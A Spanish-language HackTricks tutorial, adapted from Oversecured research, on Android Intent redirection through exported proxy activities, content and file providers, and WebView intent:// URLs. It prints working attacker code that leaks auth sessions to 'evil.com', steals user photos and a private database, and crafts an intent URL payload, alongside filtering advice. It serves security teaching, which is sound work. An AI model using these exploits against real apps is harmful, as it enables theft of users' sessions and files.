<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Investigaci√≥n tomada de** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# Introducci√≥n

Esta vulnerabilidad se asemeja a **Open Redirect en seguridad web**. Dado que la clase `Intent` es `Parcelable`, **objetos pertenecientes a esta clase** pueden ser **pasados** como **datos extra** en otro objeto `Intent`. \
Muchos desarrolladores hacen **uso** de esta **caracter√≠stica** y crean **componentes proxy** (actividades, receptores de difusi√≥n y servicios) que **toman un Intent incrustado y lo pasan a m√©todos peligrosos** como `startActivity(...)`, `sendBroadcast(...)`, etc. \
Esto es peligroso porque **un atacante puede forzar a la app a lanzar un componente no exportado que no puede ser lanzado directamente desde otra app**, o para conceder al atacante acceso a sus proveedores de contenido. **`WebView`** tambi√©n a veces cambia una **URL de un string a un objeto `Intent`**, utilizando el m√©todo `Intent.parseUri(...)`, y lo pasa a `startActivity(...)`.

{% hint style="info" %}
En resumen: Si un atacante puede enviar un Intent que se est√° ejecutando de manera insegura, potencialmente puede acceder a componentes no exportados y abusar de ellos.
{% endhint %}

# Un caso t√≠pico

Examinemos un ejemplo. Fragmento del archivo `AndroidManifest.xml`
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Actividad `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Actividad `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` es un ejemplo de **funcionalidad oculta de la aplicaci√≥n que realiza ciertas acciones inseguras**, en este caso pasando la sesi√≥n de autenticaci√≥n del usuario a una URL obtenida del par√°metro `url`.

Las restricciones de exportaci√≥n significan que **el atacante no puede acceder a `AuthWebViewActivity` directamente**. Una llamada directa
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
arroja una `java.lang.SecurityException`, debido a `Permission Denial`: `AuthWebViewActivity no exportado desde uid 1337`.

Pero el atacante puede **forzar a la v√≠ctima a lanzar `AuthWebViewActivity` por s√≠ mismo**:
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
y no surgir√° ninguna violaci√≥n de seguridad, porque **la app que est√° bajo ataque s√≠ tiene acceso a todos sus propios componentes**. Utilizando este fragmento de c√≥digo, el atacante puede eludir las restricciones integradas del sistema Android.

# Escalaci√≥n de Impacto

Para escalar el impacto de esta vulnerabilidad necesitas **encontrar otras vulnerabilidades/configuraciones err√≥neas que podr√≠an permitir aumentar el impacto de la vulnerabilidad** (ya que la vulnerabilidad por s√≠ sola no est√° creando ning√∫n riesgo).

## Escalaci√≥n de ataques a trav√©s de Content Providers

Adem√°s del acceso a componentes arbitrarios de la app original, el **atacante puede intentar obtener acceso a aquellos de los Content Providers de la app vulnerable** que cumplan con las siguientes condiciones:

* debe ser **no exportado** (de lo contrario, **podr√≠a ser atacado directamente**, sin utilizar la vulnerabilidad de la que estamos hablando en este art√≠culo)
* debe tener la bandera **`android:grantUriPermissions`** establecida en **`true`**.
* `android:grantUriPermissions="true"` indica que tu c√≥digo Java puede usar `FLAG_GRANT_READ_URI_PERMISSION` y `FLAG_GRANT_WRITE_URI_PERMISSION` para **cualquier `Uri` servido por ese `ContentProvider`**.
* `android:grantUriPermissions="false"` indica que **solo los valores `Uri` especificados por elementos hijos `<grant-uri-permission>`** pueden usarse con `FLAG_GRANT_READ_URI_PERMISSION` y `FLAG_GRANT_WRITE_URI_PERMISSION`.

El atacante debe configurarse a s√≠ mismo como el destinatario de un intent incrustado y establecer las siguientes banderas

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permite el acceso persistente al proveedor (sin esta bandera, el acceso es solo de una vez)
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permite el acceso a URI por prefijo ‚Äì por ejemplo, en lugar de obtener acceso separado repetidamente usando una ruta completa como `content://com.victim.provider/image/1` el atacante puede conceder acceso a todo el contenido del proveedor usando el URI `content://com.victim.provider/` y luego usar `ContentResolver` para dirigirse a `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` permite operaciones de lectura en el proveedor (como `query`, `openFile`, `openAssetFile`)
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permite operaciones de escritura

Un ejemplo de un proveedor t√≠pico donde un atacante puede obtener acceso y realizar operaciones regulares como `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
Ejemplo del robo de fotos de usuario en el archivo `AndroidManifest.xml`
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
El archivo `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Ataques al Android File Provider

Esta vulnerabilidad tambi√©n permite al atacante **robar archivos de aplicaciones** ubicados en directorios que el desarrollador predetermin√≥. Para un ataque exitoso, la aplicaci√≥n maliciosa necesita **obtener derechos de acceso al Android File Provider y luego leer contenido del proveedor de archivos usando Android ContentResolver**.

Ejemplo de proveedor de archivos (para m√°s detalles ver [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
Proporciona acceso de lectura/escritura a archivos en una lista especial que se puede encontrar en los recursos de la app, en este caso en `res/xml/provider_paths.xml`

Puede parecer algo as√≠
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
Cada etiqueta especifica un directorio ra√≠z con un valor de `path` relativo a la ra√≠z. Por ejemplo, el valor `external_files` corresponder√° a `new File(Environment.getExternalStorageDirectory(), "images")`

El valor `root-path` corresponde a `/`, es decir, proporciona acceso a archivos arbitrarios.

Digamos que tenemos algunos datos secretos almacenados en el archivo `/data/data/com.victim/databases/secret.db`: el robo de este archivo puede verse algo as√≠ como `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## Acceso a componentes arbitrarios a trav√©s de WebView

Un objeto Intent puede convertirse en una cadena con una llamada a `Intent.toUri(flags)` y de una cadena a un Intent usando `Intent.parseUri(stringUri, flags)`. Esta funcionalidad se utiliza a menudo en WebView (el navegador incorporado de la app): **la app puede verificar un esquema `intent://`, analizar la URL en un Intent y lanzar la actividad**.

**Esta vulnerabilidad puede ser explotada tanto a trav√©s de otras vulnerabilidades** (por ejemplo, la capacidad de abrir enlaces arbitrarios en la app en WebView directamente a trav√©s de actividades exportadas o mediante el mecanismo de enlace profundo) en la app cliente como tambi√©n de forma remota, incluyendo scripting entre sitios en el lado del servidor o MitM en el lado del cliente.

Ejemplo de c√≥digo vulnerable
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
El punto aqu√≠ es que el m√©todo `shouldOverrideUrlLoading(...)` de la clase `WebViewClient` se llama cada vez que WebView intenta cargar un nuevo enlace, pero le da a la aplicaci√≥n la opci√≥n de agregar un manejador personalizado.

Para explotar esta vulnerabilidad, el atacante necesita crear una redirecci√≥n de WebView a una URL de esquema de intent especialmente preparada. Ejemplo de creaci√≥n de URL
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
Ejemplo de ataque
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
Esta versi√≥n contiene **varias restricciones en comparaci√≥n con la versi√≥n cl√°sica** de la vulnerabilidad:

* Los objetos `Parcelable` y `Serializable` incrustados no se pueden convertir a cadena (ser√°n ignorados)
* Las banderas inseguras `Intent.FLAG_GRANT_READ_URI_PERMISSION` y `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` son **ignoradas** cuando se llama a `Intent.parseUri(...)`. El analizador solo las dejar√° si se establece la bandera `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))`, lo cual es muy raro

Muchos desarrolladores a√∫n olvidan realizar un filtrado completo de intents recibidos a trav√©s de WebView
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
El atacante puede especificar un componente no exportado a trav√©s de un selector
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
Y evadir la protecci√≥n de la aplicaci√≥n contra intents expl√≠citos. Por lo tanto, recomendamos filtrar tambi√©n el selector.
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
Pero incluso un filtrado completo no garantiza protecci√≥n total, porque un atacante puede crear un `intent` impl√≠cito correspondiente al `intent-filter` de alguna actividad no exportada. Ejemplo de declaraci√≥n de una actividad:
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
Por lo tanto, recomendamos verificar que una actividad est√© exportada antes de ser lanzada.

## Otras formas de crear intents inseguros

Algunos desarrolladores de aplicaciones implementan sus **propios analizadores de intents** (a menudo para manejar **deeplinks** o mensajes push), utilizando por ejemplo objetos **JSON**, cadenas o arreglos de bytes, que o bien no difieren del predeterminado o bien presentan un gran peligro, porque pueden expandir objetos **`Serializable`** y `Parcelable` y tambi√©n permiten establecer flags inseguros. El investigador de seguridad tambi√©n puede encontrar versiones m√°s ex√≥ticas de la creaci√≥n de intents, como convertir un arreglo de bytes en un `Parcel` y luego leer un intent de √©l.
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Aplicaci√≥n vulnerable

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
